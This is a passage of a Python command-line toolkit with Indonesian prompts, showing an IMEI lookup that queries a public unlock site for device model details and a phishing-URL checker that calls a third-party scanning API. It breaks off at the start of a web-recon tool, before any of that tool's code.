⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⡿⠋⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠈⠙⠿⣿⠿⠋⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣾⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀
⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣤⣀⡀⠀⠀⠀⠀⣀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠛⠛⠿⠿⢿⣿⣿⣿⣿⡿⠿⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    os.system(f'echo "{ascii_imei}" | lolcat 2>/dev/null || echo "{ascii_imei}"')
    
    print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ {W}Tools {R}: {G}IMEI Checker {R}│ {W}Developer {R}: {G}Rullzzz06
{W}╰─────────────────────────────────────────────────────────────────╯{N}""")
    print(f"{W}╭───────────────────────────────────────────────────────────────────╮{N}")
    print(f"{W}│ Masukkan IMEI Target {R}( {a}14 - 17 digit {R}){N}")
    print(f"{W}│ Contoh {R}:{a} 353911112345678{N}")
    print(f"{W}╰───────────────────────────────────────────────────────────────────╯{N}")
    
    imei = input(f"{U}❯❯❯ {W}Masukkan IMEI {G}❯{N} ").strip()
    
    if not imei:
        print(f"{W}[ {R}??{W} ] IMEI tidak boleh kosong!{N}")
        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
        return
    
    if not imei.isdigit() or len(imei) < 14 or len(imei) > 17:
        print(f"{W}[ {R}??{W} ] IMEI harus {a}14-17{W} digit angka!{N}")
        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
        return
    
    print(f" {W}[ {R}!!{W} ] IMEI: {a}{imei}{N}")
    
    def load_bar(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Mengecek IMEI [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    stop_loading = threading.Event()
    loading_thread = threading.Thread(target=load_bar, args=(stop_loading,))
    loading_thread.daemon = True
    loading_thread.start()
    
    time.sleep(1.5)
    
    try:
        url = "https://www.officialsimunlock.com/Home/GetIMEI"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
        }
        data = {"imei": imei}
        
        response = requests.post(url, data=data, headers=headers, timeout=15)
        stop_loading.set()
        loading_thread.join()
        
        if response.status_code == 200:
            try:
                data = response.json()
                
                print(f"\n{W}╭────────────────────────────────────────────────────────────────────────╮")
                print(f"{W}│ {G}✓{W} IMEI Ditemukan!{N}")
                print(f"{W}├────────────────────────────────────────────────────────────────────────┤")
                
                print(f"{W}│ {W}IMEI               {R}: {G}{imei}{N}")
                
                label_map = {
                    'Item1': 'Brand',
                    'Item2': 'id_name',
                    'Item3': 'model',
                    'Item4': 'id_name2',
                    'Item5': 'model 2',
                    'Item6': 'IMEI',
                    'Success': 'Status',
                    'Message': 'Message'
                }
                
                for key, value in data.items():
                    if key == "Model" and isinstance(value, dict):
                        print(f"{W}├────────────────────────────────────────────────────────────────────────┤")
                        print(f"{W}│ {G}MODEL INFORMATION{N}")
                        for sub_key, sub_value in value.items():
                            if sub_value:
                                label = label_map.get(sub_key, sub_key)
                                if isinstance(sub_value, list):
                                    print(f"{W}│ {W}{label:<18} {R}: {G}{', '.join(sub_value)}{N}")
                                else:
                                    print(f"{W}│ {W}{label:<18} {R}: {G}{sub_value}{N}")
                    else:
                        if value:
                            label = label_map.get(key, key)
                            if isinstance(value, list):
                                print(f"{W}│ {W}{label:<18} {R}: {G}{', '.join(value)}{N}")
                            else:
                                print(f"{W}│ {W}{label:<18} {R}: {G}{value}{N}")
                
                print(f"{W}╰────────────────────────────────────────────────────────────────────────╯")
                
            except json.JSONDecodeError:
                print(f"\n{W}╭────────────────────────────────────────────────────────────────────╮")
                print(f"{W}│ {R}✗{W} Respon server tidak valid (IMEI mungkin salah){N}")
                print(f"{W}╰────────────────────────────────────────────────────────────────────╯")
        else:
            print(f"\n{W}╭──────────────────────────────────────────────────────────────────╮")
            print(f"{W}│ {R}✗{W} Gagal mengambil data! Status: {response.status_code}{N}")
            print(f"{W}╰──────────────────────────────────────────────────────────────────╯")
            
    except requests.exceptions.Timeout:
        stop_loading.set()
        loading_thread.join()
        print(f"\n{R}✗ Timeout! Server tidak merespons.{N}")
    except requests.exceptions.ConnectionError:
        stop_loading.set()
        loading_thread.join()
        print(f"\n{R}✗ Gagal terhubung ke server!{N}")
    except Exception as e:
        stop_loading.set()
        loading_thread.join()
        print(f"\n{R}✗ Error: {e}{N}")
    
    input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")

def tool_web_phising():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, json, requests, threading
    from urllib.parse import urlparse, quote
    
    os.system('clear')
    
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    W = '\033[97m'
    C = '\033[96m'
    U = '\033[95m'
    N = '\033[0m'
    
    ascii_phising = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⣤⣴⣶⣶⣶⣶⣦⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⡿⠟⠛⣿⡿⠋⠁⠀⠀⠙⢿⣿⡛⠻⢿⣿⣿⣷⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣾⢿⣿⡿⠛⠁⠀⢀⣼⠟⠀⠀⠀⠀⠀⠀⠀⠹⣷⡀⠀⠈⠙⢿⣯⡙⠻⢷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⢋⣴⡿⠋⠀⠀⠀⠀⣾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⡀⠀⠀⠀⠙⢿⣦⡀⠉⠻⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⢠⣾⠏⠀⠀⠀⠀⠀⣼⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠙⣿⣆⠀⠈⠻⣷⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣾⠟⠁⠀⣰⡿⠁⠀⠀⠀⠀⠀⢠⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠈⢻⣦⠀⠀⠈⠻⣷⡄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣿⣯⣄⡀⣼⡿⠁⠀⠀⠀⠀⠀⠀⣸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⢻⣧⠀⠀⣠⣼⣿⣆⠀⠀⠀⠀
⠀⠀⠀⣰⡿⠁⠈⠙⢿⣿⣧⣤⣄⣀⡀⠀⠀⠀⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⡄⠀⠀⠀⢀⣀⣀⣤⣿⣿⠟⠋⠉⠈⢻⣦⠀⠀⠀
⠀⠀⣰⡿⠁⠀⠀⢀⣿⠃⠀⠉⠙⠛⠻⠿⠿⣿⣿⣶⣶⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣴⣿⣷⡶⠿⠿⠟⠛⠋⠉⠈⣿⡆⠀⠀⠀⠀⢿⣇⠀⠀
⠀⢠⣿⠃⠀⠀⠀⣼⡏⠀⠀⠀⠀⠀⠀⠀⠀⣼⡇⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⣷⠀⠀⠀⠀⠈⣿⡆⠀
⠀⣼⡟⠀⠀⠀⢀⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡄⠀⠀⠀⠀⢹⣷⠀
⠀⣿⠃⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡇⠀⠀⠀⠀⠈⣿⡀
⢰⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⠀⠀⠀⠀⠀⣿⡇
⢸⣿⣶⣶⣶⣶⣿⣿⣶⣶⣶⣶⣶⣶⣶⣶⣾⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣾⣿⣶⣶⣶⣶⣶⣿⡇
⢸⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⠀⣿⡇
⠀⣿⡄⠀⠀⠀⢸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⠀⠀⠀⠀⢀⣿⠃
⠀⢻⣇⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠇⠀⠀⠀⠀⢸⡿⠀
⠀⠘⣿⡄⠀⠀⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠀⠀⠀⠀⢀⣿⠇⠀
⠀⠀⢹⣷⡀⠀⠀⠘⣿⡄⠀⢀⣀⣤⣤⣴⣶⣾⣿⠿⠿⠿⠿⠛⠛⠛⠛⠛⠛⠛⠛⠻⠿⠿⣿⣿⣶⣶⣦⣤⣤⣀⡀⢀⣿⠇⠀⠀⠀⠀⣼⡟⠀⠀
⠀⠀⠀⠹⣷⡀⢀⣠⣿⣿⡿⠛⠛⠉⠉⠁⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠇⠀⠀⠀⠉⠉⠛⠻⣿⣿⣦⣄⡀⠀⣼⡟⠀⠀⠀
⠀⠀⠀⠀⠹⣿⡿⠋⠉⢻⣧⠀⠀⠀⠀⠀⠀⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀⠈⠙⢿⣿⠏⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠘⢿⣦⠀⠀⠻⣧⡀⠀⠀⠀⠀⠀⠘⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢀⣼⡟⠀⠀⠀⣠⡿⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢷⣄⠀⠙⣿⣄⠀⠀⠀⠀⠀⢻⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡿⠀⠀⠀⠀⠀⢠⣾⠏⠀⠀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣦⣈⠻⣷⣄⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠁⠀⠀⠀⢀⣴⡟⠁⢀⣤⡾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢷⣾⣿⣷⣄⡀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⣰⡿⠃⠀⠀⣠⣾⣿⣋⣤⣾⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣿⣶⣦⣄⣻⣷⣄⠀⠀⠀⣀⣴⣿⣡⣤⣶⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠿⠿⠿⠿⠿⠿⠿⠿⠛⠛⠋⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    os.system(f'echo "{ascii_phising}" | lolcat 2>/dev/null || echo "{ascii_phising}"')
    
    print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
{W}│ {W}Tools {R}: {G}Web Phising Checker {R}│ {W}Developer {R}: {G}Rullzzz06
{W}╰─────────────────────────────────────────────────────────────────╯{N}""")
    print(f"{W}╭───────────────────────────────────────────────────────────────────╮{N}")
    print(f"{W}│ Masukkan {G}Link URL{W} for Checker Phising{N}")
    print(f"{W}│ Contoh {R}:{a} https://example.com/phising{N}")
    print(f"{W}╰───────────────────────────────────────────────────────────────────╯{N}")
    
    url_target = input(f"{U}❯❯❯ {W}Masukkan URL {G}❯{N} ").strip()
    
    if not url_target:
        print(f"{W}[ {R}??{W} ] URL tidak boleh kosong!{N}")
        input(f"{U}❯❯❯ {W}Tekan Enter untuk kembali...{N}")
        return
    
    if not url_target.startswith('http://') and not url_target.startswith('https://'):
        url_target = 'https://' + url_target
    
    print(f"\n{W}[ {G}!{W} ] URL Target: {a}{url_target}{N}")
    
    def load_bar(stop_event):
        COLORS = ['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m']
        RESET = '\x1b[0m'
        length = 15
        color_index = 0
        while not stop_event.is_set():
            for i in range(length + 1):
                if stop_event.is_set():
                    break
                filled_color = COLORS[color_index % len(COLORS)] + '■' * i + RESET
                empty = '□' * (length - i)
                sys.stdout.write(f'\r [ {G}✦{W} ] Mengecek URL [[{filled_color}{empty}{W}]]')
                sys.stdout.flush()
                time.sleep(0.05)
                color_index += 1
        sys.stdout.write('\r' + ' ' * 120 + '\r')
        sys.stdout.flush()
    
    stop_loading = threading.Event()
    loading_thread = threading.Thread(target=load_bar, args=(stop_loading,))
    loading_thread.daemon = True
    loading_thread.start()
    
    time.sleep(1.5)
    
    try:
        encoded_url = quote(url_target, safe='')
        api_url = f"https://api.nexray.eu.cc/tools/webphishing?url={encoded_url}"
        
        response = requests.get(api_url, timeout=15)
        stop_loading.set()
        loading_thread.join()
        
        if response.status_code == 200:
            try:
                data = response.json()
                
                if data.get('status') == True:
                    result = data.get('result', {})
                    
                    print(f"\n{W}╭────────────────────────────────────────────────────────────────────────╮")
                    print(f"{W}│ {G}✓{W} Hasil Cek URL Phising{N}")
                    print(f"{W}├────────────────────────────────────────────────────────────────────────┤")
                    
                    scanned_url = result.get('scanned_url', url_target)
                    print(f"{W}│ {W}URL Target          {R}: {G}{scanned_url[:60]}{'...' if len(scanned_url) > 60 else ''}{N}")
                    
                    status_code = result.get('status_code', 'Tidak diketahui')
                    status_desc = result.get('status_description', 'Tidak diketahui')
                    
                    if status_code == 1:
                        status_color = G
                    elif status_code == 2:
                        status_color = Y
                    else:
                        status_color = R
                    
                    print(f"{W}│ {W}Status Code         {R}: {status_color}{status_code}{N}")
                    print(f"{W}│ {W}Status Description  {R}: {status_color}{status_desc}{N}")
                    
                    print(f"{W}├────────────────────────────────────────────────────────────────────────┤")
                    print(f"{W}│ {W}DETAIL{N}")
                    
                    is_phishing = result.get('is_phishing', False)
                    if is_phishing:
                        print(f"{W}│ {W}Phishing            {R}: {R}Terdeteksi Phising!{N}")
                    else:
                        print(f"{W}│ {W}Phishing            {R}: {G}Tidak terdeteksi{N}")
                    
                    contains_malware = result.get('contains_malware', False)
                    if contains_malware:
                        print(f"{W}│ {W}Malware             {R}: {R}Terdeteksi Malware!{N}")
                    else:
                        print(f"{W}│ {W}Malware             {R}: {G}Tidak terdeteksi{N}")
                    
                    sends_to_harmful = result.get('sends_to_harmful_sites', False)
                    if sends_to_harmful:
                        print(f"{W}│ {W}Redirect Berbahaya  {R}: {R}Ya{N}")
                    else:
                        print(f"{W}│ {W}Redirect Berbahaya  {R}: {G}Tidak{N}")
                    
                    installs_malware = result.get('installs_malicious_software', False)
                    if installs_malware:
                        print(f"{W}│ {W}Install Malware     {R}: {R}Ya{N}")
                    else:
                        print(f"{W}│ {W}Install Malware     {R}: {G}Tidak{N}")
                    
                    uncommon_downloads = result.get('uncommon_downloads', False)
                    if uncommon_downloads:
                        print(f"{W}│ {W}Download Mencurigakan{R}: {R}Ya{N}")
                    else:
                        print(f"{W}│ {W}Download Mencurigakan{R}: {G}Tidak{N}")
                    
                    print(f"{W}╰────────────────────────────────────────────────────────────────────────╯")
                    
                else:
                    print(f"\n{W}╭────────────────────────────────────────────────────────────────────╮")
                    print(f"{W}│ {W}[ {R}✗{W} ] Gagal cek URL! Response status: {data.get('status', 'Tidak diketahui')}{N}")
                    print(f"{W}╰────────────────────────────────────────────────────────────────────╯")
                
            except json.JSONDecodeError:
                print(f"\n{W}╭────────────────────────────────────────────────────────────────────╮")
                print(f"{W}│ {W}[ {R}??{W} ] Respon server tidak valid!{N}")
                print(f"{W}╰────────────────────────────────────────────────────────────────────╯")
        else:
            print(f"\n{W}╭──────────────────────────────────────────────────────────────────╮")
            print(f"{W}│ {W}[ {R}✗{W} ] Gagal mengambil data!")
            print(f"{W}╰──────────────────────────────────────────────────────────────────╯")
            
    except requests.exceptions.Timeout:
        stop_loading.set()
        loading_thread.join()
        print(f"{W}[ {R}✗{W} ] Timeout! Server tidak merespons.{N}")
    except requests.exceptions.ConnectionError:
        stop_loading.set()
        loading_thread.join()
        print(f"{W}[ {R}✗{W} ] Gagal terhubung ke server!{N}")
    except Exception as e:
        stop_loading.set()
        loading_thread.join()
        print(f"{W}[ {R}✗{W} ] Error {R}:{a} {e}{N}")
    
    input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} Untuk Kembali...{N}")

def tool_web_recon():
    play_menu_sound()
    pantau_aktivitas()
    import os, sys, time, json, re, socket, ssl, http.client, threading, concurrent.futures
    import requests
    import ipaddress
    from urllib.parse import urlparse
    from datetime import datetime

    os.system('clear')

    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    W = '\033[97m'
    C = '\033[96m'
    U = '\033[95m'
    N = '\033[0m'

    ascii_ghost = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣿⣿⡿⠿⠿⠿⠿⠿⠿⢿⣿⣿⣶⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣾⣿⡿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠁⠀⣠⣴⣶⡿⠁⠀⣴⣿⣿⣦⡀⠈⢻⣶⣦⣄⡀⠀⠙⠿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⡿⠋⠀⣀⣴⣿⣿⣿⣿⠁⠀⣼⣿⣿⣿⣿⣷⡀⠀⢿⣿⣿⣿⣶⣄⠀⠈⢻⣿⣿⣿⣿⣿⣿⣷⣶⣤⡀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣼⣿⠟⠀⠀⠐⠻⢿⣿⣿⣿⠇⠀⣸⣿⣿⣿⣿⣿⣿⣧⠀⠘⣿⣿⣿⠿⠛⠁⠀⠀⠙⣿⣿⡀⠀⠀⠈⠙⣿⣿⡀
⠀⠀⠀⠀⠀⠀⠀⣾⣿⠏⠀⢠⣶⣤⣄⡀⠀⠈⠉⠀⠀⠛⠛⠛⠛⠛⠛⠛⠛⠀⠀⠉⠁⠀⣀⣠⣴⣾⣆⠀⠘⣿⣿⡀⠀⠀⢠⣿⡿⠀
⠀⠀⠀⠀⠀⠀⣸⣿⡏⠀⢠⣿⣿⣿⣿⣿⣿⣷⡆⠀⢠⣤⣤⣤⣤⣤⣤⣤⣤⣄⠀⢰⣿⣿⣿⣿⣿⣿⣿⣆⠀⠘⣿⣷⣠⣴⣿⠟⠁⠀
⠀⠀⠀⠀⠀⢀⣿⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡄⢀⣿⣿⣿⠟⠁⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⡇⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣀⣼⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣶⣿⡿⠟⠋⠁⢀⣴⣶⠀⠀⠀⠀⠀
⠀⠀⣠⣾⣿⢿⣿⡇⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣀⣤⣿⣿⣿⠿⠛⠉⢀⣠⡄⠀⢸⣿⡏⠀⠀⠀⠀⠀
⠀⣴⣿⡟⠁⠈⣿⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠋⠁⢀⣠⣴⣾⣿⣿⠃⠀⣼⣿⠇⠀⠀⠀⠀⠀
⠰⣿⣿⠀⠀⠀⢹⣿⣇⠀⠘⣿⣿⣿⣿⣿⣿⣿⣧⣤⣼⣿⣿⣿⡿⠿⠛⠋⠉⠀⠀⠠⣶⣾⣿⣿⣿⣿⣿⠏⠀⢠⣿⡿⠀⠀⠀⠀⠀⠀
⠀⠻⢿⣷⣶⣦⣤⣿⣿⣦⣴⣿⣿⣿⣿⣿⣿⠿⠿⠟⠛⠉⠉⢀⣀⣠⣤⣤⣤⠀⠀⣀⡀⠀⠉⠙⠻⢿⠏⠀⢠⣿⣿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠉⠙⠛⠛⠛⠛⠛⠉⠉⠉⠁⢀⣀⣀⣤⡄⠀⢰⣿⣿⣿⣿⣿⣿⡟⠀⢠⣿⣿⣿⣶⣤⡀⠀⠀⣠⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣶⣶⣄⠀⠈⠻⣿⣿⣿⣿⡀⠀⢻⣿⣿⣿⣿⡿⠁⠀⣾⣿⣿⣿⠿⠋⠀⢀⣼⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣷⣄⡀⠀⠙⠻⠿⣷⡀⠀⠻⣿⣿⠟⠁⢀⣼⠿⠟⠋⠁⠀⣠⣶⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣷⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣶⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣾⣿⣿⠿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"""
    os.system(f'echo "{ascii_ghost}" | lolcat 2>/dev/null || echo "{ascii_ghost}"')

    print(f"""
{W}╭─────────────────────────────────────────────────────────────────╮
